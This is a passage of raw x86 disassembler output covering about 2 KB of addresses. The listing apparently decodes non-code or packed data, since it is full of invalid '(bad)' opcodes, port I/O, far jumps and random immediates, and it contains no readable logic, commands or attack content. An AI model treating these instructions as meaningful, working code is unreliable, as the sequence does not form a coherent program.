  4be6d6:	mov    bl,0x7c
  4be6d8:	xchg   ecx,eax
  4be6d9:	jl     0x4be670
  4be6db:	mov    dh,0x38
  4be6dd:	add    al,0x39
  4be6df:	lods   eax,DWORD PTR ds:[esi]
  4be6e0:	mov    WORD PTR [ecx],gs
  4be6e2:	and    DWORD PTR [edi-0x63e3f936],edx
  4be6e8:	(bad)  
  4be6e9:	cwde   
  4be6ea:	xchg   ebx,eax
  4be6eb:	xchg   esp,eax
  4be6ec:	mov    BYTE PTR [ecx+0x26890754],bl
  4be6f2:	scas   al,BYTE PTR es:[edi]
  4be6f3:	int3   
  4be6f4:	adc    BYTE PTR [ecx+0x79],ah
  4be6f7:	push   edi
  4be6f8:	aas    
  4be6f9:	xchg   esi,eax
  4be6fa:	mov    ah,0xe9
  4be6fc:	int    0xbf
  4be6fe:	lods   al,BYTE PTR ds:[esi]
  4be6ff:	stos   DWORD PTR es:[edi],eax
  4be700:	dec    edi
  4be701:	cwde   
  4be702:	ror    BYTE PTR [ebx-0x6f],0x18
  4be706:	pusha  
  4be707:	std    
  4be708:	xchg   ebp,eax
  4be709:	add    BYTE PTR ds:0xfb83140d,bl
  4be70f:	arpl   WORD PTR [ebp+0x33],si
  4be712:	rcl    DWORD PTR [esi+0x59f92583],0xe0
  4be719:	pop    ebp
  4be71a:	shl    al,cl
  4be71c:	gs (bad) 
  4be71e:	jl     0x4be755
  4be720:	jne    0x4be6fc
  4be722:	push   es
  4be723:	jle    0x4be773
  4be725:	push   eax
  4be726:	push   esi
  4be727:	mov    DWORD PTR [ebx],ecx
  4be729:	das    
  4be72a:	xchg   edi,eax
  4be72b:	mov    DWORD PTR [eax-0x48e5d987],eax
  4be731:	adc    BYTE PTR [ecx+0x1f],cl
  4be734:	jbe    0x4be7b0
  4be736:	jle    0x4be6c6
  4be738:	test   DWORD PTR [ecx],ebx
  4be73a:	clc    
  4be73b:	dec    ebx
  4be73c:	movd   DWORD PTR [ebx+0x40],mm7
  4be740:	push   eax
  4be741:	mov    DWORD PTR [ebx+0x17],ebx
  4be744:	(bad)  
  4be745:	and    cl,cl
  4be747:	sub    edx,DWORD PTR [edx-0x6e]
  4be74a:	xor    eax,DWORD PTR [edx-0x7c]
  4be74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4be74e:	rcr    esi,0xc6
  4be751:	dec    ecx
  4be752:	adc    eax,0x5e846098
  4be757:	fimul  WORD PTR [ecx]
  4be759:	imul   edx,DWORD PTR [edx+0x12eb5e0b],0xffffffce
  4be760:	(bad)  
  4be761:	adc    eax,0x34854917
  4be766:	loopne 0x4be7b3
  4be768:	add    BYTE PTR [esi+edi*2],dl
  4be76b:	fldenv [edx+0x18]
  4be76e:	jmp    0x4be7b8
  4be770:	add    esp,DWORD PTR [eax+0x7eb2c84]
  4be776:	cmp    BYTE PTR [edx],dh
  4be778:	dec    eax
  4be779:	add    eax,0xa90907a1
  4be77e:	jae    0x4be788
  4be780:	stc    
  4be781:	int3   
  4be782:	sbb    BYTE PTR [edx+eax*1-0x6ca56d9d],bl
  4be789:	mov    cl,0x79
  4be78b:	les    ecx,FWORD PTR [ecx+0x2]
  4be78e:	xchg   BYTE PTR [edi+ebx*2-0x79e4e78f],ch
  4be795:	fcmovbe st,st(4)
  4be797:	jl     0x4be7cd
  4be799:	and    bh,BYTE PTR [esi]
  4be79b:	mov    ?,esi
  4be79d:	pusha  
  4be79e:	mov    ch,0x40
  4be7a0:	iret   
  4be7a1:	repz cmp al,0x6f
  4be7a4:	neg    BYTE PTR [esi]
  4be7a6:	push   0x702c6c28
  4be7ab:	and    al,BYTE PTR [ebx]
  4be7ad:	cmp    al,BYTE PTR [eax-0x20]
  4be7b0:	in     eax,0xa4
  4be7b2:	ret    0x6e06
  4be7b5:	fdivr  QWORD PTR [esi+0x4]
  4be7b8:	add    DWORD PTR [edx+0x4647b40],edx
  4be7be:	dec    ebx
  4be7bf:	je     0x4be7f4
  4be7c1:	add    al,0x18
  4be7c3:	dec    ebp
  4be7c4:	cmp    eax,0x308e34f0
  4be7c9:	ins    BYTE PTR es:[edi],dx
  4be7ca:	adc    BYTE PTR [edx-0x5],ah
  4be7cd:	je     0x4be807
  4be7cf:	or     ebx,ebp
  4be7d1:	cs out dx,eax
  4be7d3:	push   edx
  4be7d4:	das    
  4be7d5:	push   ecx
  4be7d6:	inc    esi
  4be7d7:	pop    eax
  4be7d8:	mov    eax,0x5c1a2c9f
  4be7dd:	sub    cl,BYTE PTR [ecx-0x40]
  4be7e0:	dec    ecx
  4be7e1:	es ins BYTE PTR es:[edi],dx
  4be7e3:	adc    BYTE PTR [eax+0x29],ch
  4be7e6:	ret    
  4be7e7:	pushf  
  4be7e8:	jo     0x4be79d
  4be7ea:	pop    ebp
  4be7eb:	cld    
  4be7ec:	or     al,0xa4
  4be7ee:	dec    ebx
  4be7ef:	dec    ebx
  4be7f0:	jl     0x4be83f
  4be7f2:	movzx  edi,WORD PTR [ebx+0x127b730b]
  4be7f9:	or     BYTE PTR [esp+0x1a],dl
  4be7fd:	test   al,0x51
  4be7ff:	pop    ds
  4be800:	sbb    dl,BYTE PTR [edx+0x3d]
  4be803:	mov    al,ds:0x50217dc7
  4be808:	and    cl,BYTE PTR [edx+0x69]
  4be80b:	push   eax
  4be80c:	sbb    BYTE PTR [eax+0x21],bl
  4be80f:	add    bh,BYTE PTR [edi]
  4be811:	push   eax
  4be812:	das    
  4be813:	loope  0x4be817
  4be815:	shl    DWORD PTR [eax],cl
  4be817:	imul   eax,DWORD PTR ss:[ecx],0xe4dd4284
  4be81e:	or     DWORD PTR ds:0x9ea1156e,ecx
  4be824:	push   cs
  4be825:	imul   edx,DWORD PTR [edi-0x6dbbe218],0x14
  4be82c:	mov    DWORD PTR [edx-0x693eb173],edx
  4be832:	sbb    DWORD PTR [ebx],edx
  4be834:	pop    ebx
  4be835:	je     0x4be855
  4be837:	xchg   edx,eax
  4be838:	fistp  DWORD PTR [ebp-0x7d]
  4be83b:	and    BYTE PTR [esi+edx*2],bl
  4be83e:	outs   dx,BYTE PTR ds:[esi]
  4be83f:	pop    ebx
  4be840:	sbb    BYTE PTR [ebx+0x57406b06],al
  4be846:	dec    edi
  4be847:	and    cl,BYTE PTR [edx+0x56]
  4be84a:	rcl    esp,0x6e
  4be84d:	pop    edi
  4be84e:	push   ecx
  4be84f:	pop    ebx
  4be850:	add    edx,DWORD PTR [ebx]
  4be852:	pop    es
  4be853:	rcl    DWORD PTR [esp+ebx*8+0x1304505b],0x26
  4be85b:	leave  
  4be85c:	test   DWORD PTR [esp+0x5],ebx
  4be860:	sub    BYTE PTR [edx+0x59021815],bh
  4be866:	stos   DWORD PTR es:[edi],eax
  4be867:	adc    eax,0x3c09d06
  4be86c:	push   ebx
  4be86d:	loope  0x4be894
  4be86f:	push   ss
  4be870:	mov    dl,0x34
  4be872:	add    bl,BYTE PTR [ebp+0x1a26a5c8]
  4be878:	sbb    BYTE PTR [ebx+ebp*4],bl
  4be87b:	inc    esi
  4be87c:	inc    esp
  4be87d:	mov    edx,0x981ca005
  4be882:	pusha  
  4be883:	daa    
  4be884:	push   eax
  4be885:	pop    ds
  4be886:	xchg   ebx,eax
  4be887:	sub    edi,DWORD PTR [eax-0x3de717f6]
  4be88d:	cmp    dh,BYTE PTR [edx-0x28]
  4be890:	cs push 0x96b6f84a
  4be896:	cld    
  4be897:	mov    ah,0xc
  4be899:	xchg   BYTE PTR [eax+eax*4],dl
  4be89c:	inc    edi
  4be89d:	in     al,0x27
  4be89f:	retf   
  4be8a0:	and    al,0xfc
  4be8a2:	and    al,0xe2
  4be8a4:	jnp    0x4be8a8
  4be8a6:	or     dh,BYTE PTR [ecx+0x41ca0c6a]
  4be8ac:	imul   ebp,DWORD PTR [edx],0xffffff91
  4be8af:	push   cs
  4be8b0:	arpl   WORD PTR [edx+0x49],di
  4be8b3:	sbb    edx,DWORD PTR [eax]
  4be8b5:	shr    ebx,0x6
  4be8b8:	xor    bl,BYTE PTR [ebx+0xc0e27b2]
  4be8be:	xor    bh,BYTE PTR es:[esi]
  4be8c1:	loope  0x4be89e
  4be8c3:	inc    ebx
  4be8c4:	mov    esp,0x3c744b7e
  4be8c9:	jae    0x4be8cb
  4be8cb:	jne    0x4be90a
  4be8cd:	fdivr  DWORD PTR [eax-0x4d7ff8f3]
  4be8d3:	lods   eax,DWORD PTR ds:[esi]
  4be8d4:	xor    DWORD PTR [edx+0x4],0xffffff84
  4be8d8:	sbb    BYTE PTR [eax],cl
  4be8da:	sbb    al,0x86
  4be8dc:	xor    DWORD PTR [ebx-0x3b],0xd36a1844
  4be8e3:	test   BYTE PTR [eax-0x78],ch
  4be8e6:	xor    eax,0x5642747d
  4be8ec:	lahf   
  4be8ed:	adc    DWORD PTR [edx-0x5a],esi
  4be8f0:	or     dl,BYTE PTR [ebx-0x5a2d7af0]
  4be8f6:	shr    bl,cl
  4be8f8:	or     al,0x7c
  4be8fa:	mov    ch,0x84
  4be8fc:	loop   0x4be95b
  4be8fe:	sub    DWORD PTR [ecx+eiz*2-0x43],ebp
  4be902:	mov    eax,0x42e270e1
  4be907:	cwde   
  4be908:	add    BYTE PTR ds:0xb444bb04,bl
  4be90e:	mov    al,0x93
  4be910:	mov    ebx,0x2131823c
  4be915:	lods   al,BYTE PTR es:[esi]
  4be917:	cmp    DWORD PTR [edi],ebx
  4be919:	push   0xa4bbc88d
  4be91e:	rcl    DWORD PTR [ecx+0x22],0x35
  4be922:	es inc ecx
  4be924:	imul   eax,eax,0x1be42409
  4be92a:	push   esp
  4be92b:	aad    0x14
  4be92d:	ss je  0x4be93b
  4be930:	bound  esp,QWORD PTR [ecx+0x8769cba]
  4be936:	sub    eax,0x471d619c
  4be93b:	sbb    DWORD PTR [eax+esi*4+0x14],edi
  4be93f:	pop    ebx
  4be940:	sar    BYTE PTR [eax+0x7094d11f],0x21
  4be947:	push   0x7b
  4be949:	lods   al,BYTE PTR ds:[esi]
  4be94a:	and    ch,BYTE PTR ds:0x7147f195
  4be950:	adc    BYTE PTR [edi+esi*1+0x21147725],ah
  4be957:	xchg   edi,eax
  4be958:	add    eax,0xfc4d1430
  4be95d:	jge    0x4be9a4
  4be95f:	add    cl,BYTE PTR [edi]
  4be961:	sub    bh,dh
  4be963:	push   0xffffffb5
  4be965:	mov    ebp,edx
  4be967:	mov    ebx,0x610d653f
  4be96c:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4be96e:	pop    edx
  4be96f:	out    0x3a,eax
  4be971:	xchg   edx,eax
  4be972:	aam    0x17
  4be974:	test   DWORD PTR [edi],eax
  4be976:	dec    ecx
  4be977:	mov    edi,DWORD PTR [edx+0x1f6e12b6]
  4be97d:	cmp    DWORD PTR [esi-0x7b],ebp
  4be980:	sbb    al,0xf0
  4be982:	out    0x4,eax
  4be984:	jae    0x4be908
  4be986:	jb     0x4be99d
  4be988:	test   DWORD PTR [ebx+0x31000ed6],ecx
  4be98e:	out    0x40,al
  4be990:	loop   0x4bea0c
  4be992:	xchg   ecx,eax
  4be993:	add    ebp,DWORD PTR [ebx+edx*8]
  4be996:	aam    0xe7
  4be998:	mov    ds:0xf21061ae,al
  4be99d:	push   edi
  4be99e:	fnstsw WORD PTR [ebp+0x35]
  4be9a1:	addr16 inc ebx
  4be9a3:	add    eax,0xad9db470
  4be9a8:	push   ds
  4be9a9:	sub    DWORD PTR [ebp-0x23],esp
  4be9ac:	sub    eax,0x35c8df6
  4be9b1:	xor    DWORD PTR [ebx],esp
  4be9b3:	inc    esi
  4be9b4:	jmp    0x4be975
  4be9b6:	loopne 0x4be9dd
  4be9b8:	test   BYTE PTR [eax+0x66582549],cl
  4be9be:	call   0xf0d7cbea
  4be9c3:	adc    edi,edx
  4be9c5:	add    dh,al
  4be9c7:	inc    esi
  4be9c8:	ror    DWORD PTR [ebp+ecx*4-0x5c],cl
  4be9cc:	and    BYTE PTR [eax],al
  4be9ce:	inc    ebx
  4be9cf:	jmp    0x94c0:0x4238007d
  4be9d6:	pop    edi
  4be9d7:	push   ss
  4be9d8:	or     al,0x99
  4be9da:	js     0x4bea4e
  4be9dc:	push   ecx
  4be9dd:	sbb    ah,BYTE PTR [eax+0xca64732]
  4be9e3:	sub    esi,DWORD PTR [eax+0x7bee442e]
  4be9e9:	pop    ecx
  4be9ea:	mov    bh,0x1a
  4be9ec:	pop    eax
  4be9ed:	mov    eax,0x3602753d
  4be9f2:	shl    BYTE PTR [eax],1
  4be9f4:	ret    
  4be9f5:	or     BYTE PTR [edx-0x50],0x7b
  4be9f9:	xchg   ecx,eax
  4be9fa:	loopne 0x4be9b7
  4be9fc:	iret   
  4be9fd:	pusha  
  4be9fe:	cmp    BYTE PTR [ebx+0x752a4c08],al
  4bea04:	out    dx,eax
  4bea05:	stos   BYTE PTR es:[edi],al
  4bea06:	jo     0x4bea2d
  4bea08:	or     BYTE PTR [edi+0x657e4e43],dh
  4bea0e:	sub    eax,0x106e805e
  4bea13:	add    ebx,DWORD PTR fs:[edi+0x7f1e8f35]
  4bea1a:	lea    ebp,ss:[ebx+0x4a]
  4bea1e:	inc    ebx
  4bea1f:	inc    edi
  4bea20:	pop    edi
  4bea21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bea22:	pop    edx
  4bea23:	adc    BYTE PTR [eax],0x83
  4bea26:	mov    ebx,0xa724c1a0
  4bea2b:	and    esi,DWORD PTR [edi-0x37]
  4bea2e:	inc    esi
  4bea2f:	push   esi
  4bea30:	xchg   ecx,eax
  4bea31:	ret    0x4106
  4bea34:	into   
  4bea35:	jne    0x4bea40
  4bea37:	inc    ebx
  4bea38:	pop    ebx
  4bea39:	shl    bh,0xe7
  4bea3c:	adc    al,0x74
  4bea3e:	test   DWORD PTR [ebx],0xed7dfb60
  4bea44:	je     0x4bea77
  4bea46:	mov    edx,0xc1832611
  4bea4b:	sub    eax,0xebdce975
  4bea50:	in     eax,dx
  4bea51:	ins    DWORD PTR es:[edi],dx
  4bea52:	or     al,0xba
  4bea54:	fldenv gs:0xa4574882
  4bea5b:	add    DWORD PTR [esi-0x7e59b7b0],edi
  4bea61:	push   ebp
  4bea62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bea63:	fucom  st(1)
  4bea65:	add    eax,0x3b1d2b41
  4bea6a:	pushf  
  4bea6b:	xchg   esi,eax
  4bea6c:	retf   
  4bea6d:	enter  0x754b,0x2c
  4bea71:	pop    esp
  4bea72:	add    DWORD PTR [edi+0xb116c08],esi
  4bea78:	adc    eax,0x1309d61
  4bea7d:	mov    ecx,0x3216a27a
  4bea82:	dec    esp
  4bea83:	lods   al,BYTE PTR ds:[esi]
  4bea84:	and    ch,dh
  4bea86:	mov    ah,0x92
  4bea88:	jmp    0x4117333a
  4bea8d:	add    eax,0x5eadf08d
  4bea92:	out    dx,al
  4bea93:	push   ebp
  4bea94:	rol    eax,cl
  4bea96:	inc    ebx
  4bea97:	mov    bh,0x48
  4bea99:	pop    ecx
  4bea9a:	test   eax,0x3f6bfd74
  4bea9f:	adc    BYTE PTR [ebx],bh
  4beaa1:	(bad)  
  4beaa2:	sahf   
  4beaa3:	cld    
  4beaa4:	adc    al,0x29
  4beaa6:	add    DWORD PTR [ebp+0xf],edx
  4beaa9:	(bad)  
  4beaaa:	je     0x4bea82
  4beaac:	xor    bl,dh
  4beaae:	aad    0x34
  4beab0:	dec    ebp
  4beab1:	adc    al,BYTE PTR [eax+ecx*1]
  4beab4:	or     al,0x10
  4beab6:	stos   BYTE PTR es:[edi],al
  4beab7:	sbb    BYTE PTR [edx-0x2a],al
  4beaba:	mov    ds:0x14c67ea9,eax
  4beabf:	pop    esi
  4beac0:	sbb    bl,BYTE PTR [eax]
  4beac2:	add    al,0xc7
  4beac4:	xor    bh,BYTE PTR [ebp-0x5e]
  4beac7:	mov    esi,0x3942a84e
  4beacc:	loopne 0x4bea5c
  4beace:	test   eax,0xc082bfa1
  4bead3:	xchg   ch,bh
  4bead5:	adc    al,0x7b
  4bead7:	cmp    edx,0x3b
  4beada:	sbb    BYTE PTR [ecx+0x62],ch
  4beadd:	xchg   ebx,eax
  4beade:	and    BYTE PTR [esi],bh
  4beae0:	jne    0x4beb00
  4beae2:	or     al,0x32
  4beae4:	rcr    DWORD PTR [esi+0x7c],1
  4beae7:	cmp    dl,0x1e
  4beaea:	cmp    eax,0xcec065c2
  4beaef:	xchg   edx,eax
  4beaf0:	(bad)  
  4beaf2:	and    BYTE PTR gs:[ecx+0x1f],dl
  4beaf6:	stos   BYTE PTR es:[edi],al
  4beaf7:	push   edi
  4beaf8:	add    DWORD PTR [ebx],eax
  4beafa:	adc    dl,cl
  4beafc:	js     0x4beacf
  4beafe:	retf   0xe76
  4beb01:	jne    0x4beb74
  4beb03:	cmp    edx,edi
  4beb05:	mov    esi,0x26ec2ad
  4beb0a:	cmp    DWORD PTR [eax],ebp
  4beb0c:	je     0x4beb57
  4beb0e:	inc    esi
  4beb0f:	inc    ebp
  4beb10:	inc    ecx
  4beb11:	inc    edx
  4beb12:	or     al,0xbd
  4beb14:	ror    BYTE PTR [ecx],1
  4beb16:	or     BYTE PTR [eax+0x66],dh
  4beb19:	cmp    DWORD PTR [eax+ebp*8+0x10],edx
  4beb1d:	adc    al,0x4
  4beb1f:	xor    eax,0x194f0839
  4beb24:	test   eax,0x1d9c8825
  4beb29:	jecxz  0x4beb71
  4beb2b:	mov    ch,0x6f
  4beb2d:	loope  0x4beb65
  4beb2f:	imul   bl
  4beb31:	push   ss
  4beb32:	adc    eax,0xc409194c
  4beb37:	or     al,0x14
  4beb39:	or     eax,0x28cad0e0
  4beb3e:	pusha  
  4beb3f:	xor    dl,BYTE PTR es:[eax-0x4e]
  4beb43:	sub    DWORD PTR [esi+eax*1-0x68],0x32833ba5
  4beb4b:	jb     0x4beb58
  4beb4d:	jl     0x70743ba4
  4beb53:	mov    dl,0xfb
  4beb55:	js     0x4beb43
  4beb57:	sub    al,0xa2
  4beb59:	push   esp
  4beb5a:	mov    edx,0x9e441b7
  4beb5f:	adc    BYTE PTR [edi],ch
  4beb61:	add    eax,0xcb2d838
  4beb66:	jno    0x4beba5
  4beb68:	pusha  
  4beb69:	adc    al,0x88
  4beb6b:	jp     0x4beb33
  4beb6d:	retf   
  4beb6e:	adc    DWORD PTR [edx+ecx*2+0x13],esi
  4beb72:	mov    ah,0x76
  4beb74:	mov    esi,esp
  4beb76:	popa   
  4beb77:	add    eax,0x16c3d038
  4beb7c:	push   0x3b
  4beb7e:	xlat   BYTE PTR ds:[ebx]
  4beb7f:	or     BYTE PTR [ebx-0x7d],0x5c
  4beb83:	cmp    al,0x38
  4beb85:	(bad)  
  4beb86:	leave  
  4beb87:	xlat   BYTE PTR ds:[ebx]
  4beb88:	pop    ecx
  4beb89:	pop    ebx
  4beb8a:	push   ebp
  4beb8b:	mov    bh,0x11
  4beb8d:	popa   
  4beb8e:	sub    al,0x32
  4beb90:	enter  0x3b48,0x4e
  4beb94:	or     BYTE PTR [edx+0xc],ah
  4beb97:	sub    al,0x28
  4beb99:	dec    ecx
  4beb9a:	imul   eax,eax,0x102c01e4
  4beba0:	sbb    ch,BYTE PTR [edi]
  4beba2:	sub    al,0x38
  4beba4:	(bad)  
  4beba5:	in     al,0xf8
  4beba7:	sub    DWORD PTR [eax],eax
  4beba9:	and    eax,0x84d867a8
  4bebae:	inc    edi
  4bebaf:	add    al,0x20
  4bebb1:	xor    al,0xe0
  4bebb3:	and    BYTE PTR [ecx+0x41],dl
  4bebb6:	push   ecx
  4bebb7:	imul   eax,esp,0x8e4f938
  4bebbd:	push   esi
  4bebbe:	inc    esp
  4bebbf:	fild   DWORD PTR [esi+0x18]
  4bebc2:	out    0xe3,al
  4bebc4:	gs sub esi,eax
  4bebc7:	inc    edx
  4bebc8:	adc    bl,BYTE PTR [eax-0x43]
  4bebcb:	jne    0x4bebe8
  4bebcd:	add    DWORD PTR [esi],ecx
  4bebcf:	fbld   TBYTE PTR [eax]
  4bebd1:	call   0x2b08:0x124a4b16
  4bebd8:	stos   BYTE PTR es:[edi],al
  4bebd9:	ds dec edx
  4bebdb:	push   esp
  4bebdc:	add    cl,dl
  4bebde:	dec    ecx
  4bebdf:	or     al,BYTE PTR [ebx+0x61]
  4bebe2:	push   eax
  4bebe3:	mov    bh,0xc2
  4bebe5:	sar    DWORD PTR [edx-0x1f06a23f],1
  4bebeb:	xlat   BYTE PTR ds:[ebx]
  4bebec:	rol    BYTE PTR [eax+eiz*8+0x1f8a3b16],1
  4bebf3:	mov    eax,0x3708be29
  4bebf8:	loop   0x4bec28
  4bebfa:	jle    0x4bec2b
  4bebfc:	mov    ecx,0xc1d69bae
  4bec01:	retf   0xc773
  4bec04:	add    al,0x86
  4bec06:	mov    ebp,0x6562483
  4bec0b:	adc    DWORD PTR [edi],eax
  4bec0d:	jl     0x4bec00
  4bec0f:	push   esp
  4bec10:	xchg   edx,eax
  4bec11:	mov    bh,0xe2
  4bec13:	push   ebx
  4bec14:	nop
  4bec15:	dec    ecx
  4bec16:	mov    edi,0x1aca2ec
  4bec1b:	add    eax,0x14d0d39c
  4bec20:	mul    BYTE PTR [ebx+0x1c]
  4bec23:	adc    BYTE PTR [edi+ebx*8-0x6b24ab20],0x8d
  4bec2b:	or     BYTE PTR [ebx+0x49],dl
  4bec2e:	adc    cl,BYTE PTR [eax+0x21]
  4bec31:	not    DWORD PTR [si-0x3dfa]
  4bec36:	mov    ds:0xbb497e09,eax
  4bec3b:	loope  0x4bebbe
  4bec3d:	and    dh,BYTE PTR [ebx]
  4bec3f:	inc    ebx
  4bec40:	jmp    FWORD PTR [esi-0x40]
  4bec43:	or     BYTE PTR [edx-0x32211e39],ch
  4bec49:	xor    ch,BYTE PTR [ecx]
  4bec4b:	or     ebp,DWORD PTR [edi+0x76970e14]
  4bec51:	add    al,al
  4bec53:	psadbw mm1,QWORD PTR [ebx]
  4bec56:	push   ss
  4bec57:	clc    
  4bec58:	pop    eax
  4bec59:	xchg   BYTE PTR [esi+0xa],al
  4bec5c:	push   cs
  4bec5d:	adc    eax,DWORD PTR [ecx+0x61]
  4bec60:	or     DWORD PTR [edi],0xffffffda
  4bec63:	in     al,dx
  4bec64:	push   ds
  4bec65:	cmp    esp,DWORD PTR [edi+0x19babc7c]
  4bec6b:	das    
  4bec6c:	or     BYTE PTR [eax],bh
  4bec6e:	sbb    eax,0x52cd669e
  4bec73:	outs   dx,BYTE PTR ds:[esi]
  4bec74:	xor    al,BYTE PTR [ebp+edi*2-0x3fc6facc]
  4bec7b:	pop    ecx
  4bec7c:	arpl   WORD PTR [ebp+0x69651c20],di
  4bec82:	fdivp  st(4),st
  4bec84:	ret    
  4bec85:	cmp    DWORD PTR [ebp+0x3c],esp
  4bec88:	mov    esi,0xb015fb5
  4bec8d:	or     edi,DWORD PTR [eax+0x10]
  4bec90:	test   BYTE PTR [esi],dl
  4bec92:	aaa    
  4bec93:	add    BYTE PTR [edx+eax*4-0x76c045a0],dl
  4bec9a:	pop    esp
  4bec9b:	rcr    BYTE PTR [edi-0x2c],1
  4bec9e:	fs mov esi,0xfc8b6114
  4beca4:	rcr    DWORD PTR [eax+0x7cd73bd6],1
  4becaa:	fist   WORD PTR [eax-0x46]
  4becad:	popf   
  4becae:	jle    0x4becf0
  4becb0:	mov    edx,0x50550880
  4becb5:	add    dh,BYTE PTR [eax]
  4becb7:	mov    dh,0xb0
  4becb9:	sahf   
  4becba:	test   BYTE PTR [eax-0x3c],dl
  4becbd:	jo     0x4bec5b
  4becbf:	add    DWORD PTR [ebx*4+0x59061493],0xeee06341
  4becca:	dec    eax
  4beccb:	and    dh,BYTE PTR [esi]
  4beccd:	adc    al,0x9
  4beccf:	inc    eax
  4becd0:	jnp    0x4becd6
  4becd2:	mov    ecx,0x63d004ec
  4becd7:	add    ch,dh
  4becd9:	dec    esi
  4becda:	fistp  WORD PTR [ebp-0x24]
  4becdd:	inc    edi
  4becde:	push   cs
  4becdf:	shl    BYTE PTR ds:0x2f799a84,0x29
  4bece6:	cmp    eax,0x14426088
  4beceb:	imul   edx,DWORD PTR [ecx],0xb129d354
  4becf1:	pop    es
  4becf2:	adc    BYTE PTR [eax+edi*8],0xb0
  4becf6:	test   al,0x6b
  4becf8:	sbb    DWORD PTR [ebx],ebx
  4becfa:	jbe    0x4bec85
  4becfc:	mov    ebx,DWORD PTR [eax+0x59]
  4becff:	mov    al,0xd
  4bed01:	xchg   BYTE PTR [edi],al
  4bed03:	xor    BYTE PTR [esi+edx*1-0x654ffb9c],dl
  4bed0a:	test   eax,0xd65073bb
  4bed0f:	sar    esi,cl
  4bed11:	push   ecx
  4bed12:	dec    eax
  4bed13:	cld    
  4bed14:	shr    DWORD PTR [esi-0x7ca6535a],0x98
  4bed1b:	adc    al,0xce
  4bed1d:	add    al,0x77
  4bed1f:	ins    BYTE PTR es:[edi],dx
  4bed20:	idiv   DWORD PTR [edx+ecx*8+0x49]
  4bed24:	or     al,0xd
  4bed26:	out    0x80,eax
  4bed28:	dec    esi
  4bed29:	jecxz  0x4becfb
  4bed2b:	sbb    eax,0x6d1a4351
  4bed30:	and    ebp,DWORD PTR [ebp-0x3f08f7da]
  4bed36:	mov    ds:0xdadf89a0,al
  4bed3b:	stc    
  4bed3c:	xchg   esp,eax
  4bed3d:	jbe    0x4bed8b
  4bed3f:	jb     0x4bed49
  4bed41:	xchg   DWORD PTR [ecx+eax*4],eax
  4bed44:	mov    ah,0x15
  4bed46:	inc    eax
  4bed47:	xchg   edi,eax
  4bed48:	jl     0x4bed77
  4bed4a:	jno    0x4becfc
  4bed4c:	sbb    al,BYTE PTR [ecx]
  4bed4e:	mov    esp,0x70da195d
  4bed53:	or     eax,0x5b579d34
  4bed58:	adc    dh,BYTE PTR [edx]
  4bed5a:	mov    al,0xda
  4bed5c:	dec    eax
  4bed5d:	leave  
  4bed5e:	dec    eax
  4bed5f:	retf   0x960e
  4bed62:	lock ror BYTE PTR [edi+0xc],1
  4bed66:	push   ecx
  4bed67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bed68:	add    DWORD PTR [eax],ebp
  4bed6a:	jmp    0x47:0x96e4f0f1
  4bed71:	cmp    bh,BYTE PTR [eax-0x4dd912e4]
  4bed77:	icebp  
  4bed78:	sbb    al,0x7
  4bed7a:	jne    0x4bed4c
  4bed7c:	scas   al,BYTE PTR es:[edi]
  4bed7d:	sbb    dl,BYTE PTR [edi+0x67]
  4bed80:	sub    eax,0x63088285
  4bed85:	fwait
  4bed86:	pop    esi
  4bed87:	popa   
  4bed88:	add    edx,DWORD PTR [eax+edi*2+0x53]
  4bed8c:	mov    eax,0xbca8604
  4bed91:	aaa    
  4bed92:	mov    cl,0x0
  4bed94:	stos   DWORD PTR es:[edi],eax
  4bed95:	ucomiss xmm4,DWORD PTR [edx]
  4bed98:	call   0x80bc:0xb9876858
  4bed9f:	jbe    0x4bed4d
  4beda1:	push   eax
  4beda2:	mov    edx,0x8817a914
  4beda7:	outs   dx,DWORD PTR ds:[esi]
  4beda8:	mov    eax,ds:0x8d7da72d
  4bedad:	sbb    DWORD PTR [ecx],eax
  4bedaf:	aaa    
  4bedb0:	add    ebx,DWORD PTR [ebx+0x52]
  4bedb3:	test   BYTE PTR [ecx-0x6f8de730],dl
  4bedb9:	sub    ebp,DWORD PTR [eax]
  4bedbb:	or     bl,ah
  4bedbd:	loop   0x4bedcc
  4bedbf:	adc    bl,BYTE PTR [ecx-0x45c7c670]
  4bedc5:	cmp    al,0xc5
  4bedc7:	cmp    eax,0x48a66009
  4bedcc:	lahf   
  4bedcd:	imul   ebp,ecx,0xa04e58bd
  4bedd3:	sbb    DWORD PTR [esi+0x3d],0xffffffc5
  4bedd7:	pop    es
  4bedd8:	adc    bl,BYTE PTR [ebp+ebx*8+0x5b575077]
  4beddf:	fst    DWORD PTR [edx+eax*4+0x20]
  4bede3:	and    DWORD PTR [edx],ecx
  4bede5:	scas   eax,DWORD PTR es:[edi]
  4bede6:	push   ebp
  4bede7:	sbb    al,0x53
  4bede9:	aad    0x3e
  4bedeb:	loope  0x4bed77
  4beded:	ret    0xa32b
  4bedf0:	push   edi
  4bedf1:	popf   
  4bedf2:	adc    ebp,0xffffffc6
  4bedf5:	ins    BYTE PTR es:[edi],dx
  4bedf6:	imul   eax,DWORD PTR [ecx+0x6618c670],0xbd22a553
  4bee00:	push   cs
  4bee01:	push   ss
  4bee02:	or     DWORD PTR [edi],0x263d076b
  4bee08:	jns    0x4bee1a
  4bee0a:	fiadd  DWORD PTR [edx]
  4bee0c:	sbb    BYTE PTR [ebp+0x68],0xb9
  4bee10:	adc    DWORD PTR [edi],ecx
  4bee12:	sub    DWORD PTR [ecx-0x10],ebp
  4bee15:	inc    ecx
  4bee16:	sub    esi,DWORD PTR [edx-0x15]
  4bee19:	sbb    ah,BYTE PTR [ecx-0x6543aaed]
  4bee1f:	ins    DWORD PTR es:[edi],dx
  4bee20:	mov    dh,0x3f
  4bee22:	mov    DWORD PTR [eax+0x6c955cf5],ebx
  4bee28:	xchg   edi,eax
  4bee29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bee2a:	stc    
  4bee2b:	cmp    al,0xef
  4bee2d:	push   es
  4bee2e:	jno    0x4bee3e
  4bee30:	(bad)  
  4bee31:	jecxz  0x4bee5b
  4bee33:	xchg   esi,eax
  4bee34:	mov    al,0x38
  4bee36:	out    dx,eax
  4bee37:	jns    0x4bedd7
  4bee39:	add    dh,BYTE PTR [ecx]
  4bee3b:	imul   ebx,DWORD PTR [eax-0x3f4f4bfa],0x27ab03e3
  4bee45:	fxch   st(0)
  4bee47:	nop
